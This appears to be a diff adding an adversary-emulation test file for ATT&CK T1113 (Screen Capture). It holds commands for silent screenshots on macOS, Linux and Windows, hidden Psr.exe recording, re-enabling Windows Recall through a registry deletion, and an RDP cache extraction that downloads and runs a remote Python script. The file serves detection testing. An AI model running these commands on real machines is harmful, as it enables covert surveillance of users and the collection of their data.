@@ -1,0 +1,252 @@
+attack_technique: T1113
+display_name: Screen Capture
+atomic_tests:
+- name: Screencapture
+  auto_generated_guid: 0f47ceb1-720f-4275-96b8-21f0562217ac
+  description: |
+    Use screencapture command to collect a full desktop screenshot
+  supported_platforms:
+  - macos
+  input_arguments:
+    output_file:
+      description: Output file path
+      type: path
+      default: /tmp/T1113_desktop.png
+  executor:
+    command: |
+      screencapture #{output_file}
+    cleanup_command: |
+      rm #{output_file}
+    name: bash
+- name: Screencapture (silent)
+  auto_generated_guid: deb7d358-5fbd-4dc4-aecc-ee0054d2d9a4
+  description: |
+    Use screencapture command to collect a full desktop screenshot
+  supported_platforms:
+  - macos
+  input_arguments:
+    output_file:
+      description: Output file path
+      type: path
+      default: /tmp/T1113_desktop.png
+  executor:
+    command: |
+      screencapture -x #{output_file}
+    cleanup_command: |
+      rm #{output_file}
+    name: bash
+- name: X Windows Capture
+  auto_generated_guid: 8206dd0c-faf6-4d74-ba13-7fbe13dce6ac
+  description: |
+    Use xwd command to collect a full desktop screenshot and review file with xwud
+  supported_platforms:
+  - linux
+  input_arguments:
+    output_file:
+      description: Output file path
+      type: path
+      default: /tmp/T1113_desktop.xwd
+    package_checker:
+      description: Package checking command for linux. Debian system command- dpkg -s x11-apps
+      type: string
+      default: rpm -q xorg-x11-apps
+    package_installer:
+      description: Package installer command for linux. Debian system command- apt-get install x11-apps
+      type: string
+      default: yum install -y xorg-x11-apps
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Package with XWD and XWUD must exist on device
+    prereq_command: |
+      if #{package_checker} > /dev/null; then exit 0; else exit 1; fi
+    get_prereq_command: |
+      sudo #{package_installer} 
+  executor:
+    command: |
+      xwd -root -out #{output_file}
+      xwud -in #{output_file}
+    cleanup_command: |
+      rm #{output_file}
+    name: bash
+- name: X Windows Capture (freebsd)
+  auto_generated_guid: 562f3bc2-74e8-46c5-95c7-0e01f9ccc65c
+  description: |
+    Use xwd command to collect a full desktop screenshot and review file with xwud
+  supported_platforms:
+  - linux
+  input_arguments:
+    output_file:
+      description: Output file path
+      type: path
+      default: /tmp/T1113_desktop.xwd
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Package with XWD and XWUD must exist on device
+    prereq_command: |
+      if [ -x "$(command -v xwd)" ]; then exit 0; else exit 1; fi
+      if [ -x "$(command -v xwud)" ]; then exit 0; else exit 1; fi
+    get_prereq_command: |
+      pkg install -y xwd xwud 
+  executor:
+    command: |
+      xwd -root -out #{output_file}
+      xwud -in #{output_file}
+    cleanup_command: |
+      rm #{output_file}
+    name: sh
+- name: Capture Linux Desktop using Import Tool
+  auto_generated_guid: 9cd1cccb-91e4-4550-9139-e20a586fcea1
+  description: |
+    Use import command from ImageMagick to collect a full desktop screenshot
+  supported_platforms:
+  - linux
+  input_arguments:
+    output_file:
+      description: Output file path
+      type: path
+      default: /tmp/T1113_desktop.png
+  dependencies:
+  - description: |
+      ImageMagick must be installed
+    prereq_command: |
+      if import -help > /dev/null 2>&1; then exit 0; else exit 1; fi
+    get_prereq_command: |
+      sudo apt install graphicsmagick-imagemagick-compat
+  executor:
+    command: |
+      import -window root #{output_file}
+    cleanup_command: |
+      rm #{output_file}
+    name: bash
+- name: Capture Linux Desktop using Import Tool (freebsd)
+  auto_generated_guid: 18397d87-38aa-4443-a098-8a48a8ca5d8d
+  description: |
+    Use import command from ImageMagick to collect a full desktop screenshot
+  supported_platforms:
+  - linux
+  input_arguments:
+    output_file:
+      description: Output file path
+      type: path
+      default: /tmp/T1113_desktop.png
+  dependencies:
+  - description: |
+      ImageMagick must be installed
+    prereq_command: |
+      if import -help > /dev/null 2>&1; then exit 0; else exit 1; fi
+    get_prereq_command: |
+      pkg install -y ImageMagick7
+  executor:
+    command: |
+      import -window root #{output_file}
+    cleanup_command: |
+      rm #{output_file}
+    name: sh
+- name: Windows Screencapture
+  auto_generated_guid: 3c898f62-626c-47d5-aad2-6de873d69153
+  description: |
+    Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_file:
+      description: Output file path
+      type: path
+      default: c:\temp\T1113_desktop.zip
+    recording_time:
+      description: Time to take screenshots
+      type: integer
+      default: 5
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12
+      Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
+      [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
+      cmd /c "timeout #{recording_time} > NULL && psr.exe /stop"
+    cleanup_command: |
+      rm #{output_file} -ErrorAction Ignore
+- name: Windows Screen Capture (CopyFromScreen)
+  auto_generated_guid: e9313014-985a-48ef-80d9-cde604ffc187
+  description: |
+    Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.
+    [Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_file:
+      description: Path where captured results will be placed
+      type: path
+      default: $env:TEMP\T1113.png
+  executor:
+    command: |
+      Add-Type -AssemblyName System.Windows.Forms
+      $screen = [Windows.Forms.SystemInformation]::VirtualScreen
+      $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+      $graphic = [Drawing.Graphics]::FromImage($bitmap)
+      $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+      $bitmap.Save("#{output_file}")
+    cleanup_command: |
+      Remove-Item #{output_file} -ErrorAction Ignore
+    name: powershell
+- name: Windows Recall Feature Enabled - DisableAIDataAnalysis Value Deleted
+  auto_generated_guid: 5a496325-0115-4274-8eb9-755b649ad0fb
+  description: |-
+    Detects the enabling of the Windows Recall feature via registry manipulation. Windows Recall can be enabled by deleting the existing "DisableAIDataAnalysis" registry value. Adversaries may enable Windows Recall as part of post-exploitation discovery and collection activities. This rule assumes that Recall is already explicitly disabled on the host, and subsequently enabled by the adversary. 
+    - https://learn.microsoft.com/en-us/windows/client-management/manage-recall
+    - https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowsai#disableaidataanalysis
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f
+      reg delete "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI" /v DisableAIDataAnalysis /f
+    cleanup_command: |
+      reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI" /v DisableAIDataAnalysis /t REG_DWORD /d 1 /f
+    name: powershell
+    elevation_required: true
+- name: RDP Bitmap Cache Extraction via bmc-tools
+  auto_generated_guid: 98f19852-7348-4f99-9e15-6ff4320464c7
+  description: |
+    Simulates an attacker extracting the RDP bitmap cache using the ANSSI "bmc-tools.py" script.
+    This test requires valid RDP bitmap cache files to exist on the system (usually created after an outgoing RDP connection is made).
+  supported_platforms:
+  - windows
+  input_arguments:
+    cache_path:
+      description: Path to the RDP Cache directory or specific .bmc file
+      type: path
+      default: $env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache
+    output_dir:
+      description: Directory to save reconstructed images
+      type: path
+      default: $env:TEMP\rdp_screens
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Python must be installed and in the PATH to run bmc-tools.py
+    prereq_command: |
+      if (Get-Command python -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      Write-Host "Please install Python manually."
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $url = 'https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py'
+      $toolsDir = "$env:TEMP\bmc-tools.py"
+       
+      # create output directory
+      New-Item -ItemType Directory -Path #{output_dir} -Force | Out-Null
+
+      # python script download
+      & curl.exe -L $url --output $toolsDir
+       
+      # execution step
+      if (Test-Path $toolsDir) { python $toolsDir -s "#{cache_path}" -d #{output_dir} -b }
+    cleanup_command: |
+      Remove-Item "$env:TEMP\bmc-tools.py" -ErrorAction SilentlyContinue
+      Remove-Item #{output_dir} -Recurse -Force -ErrorAction SilentlyContinue
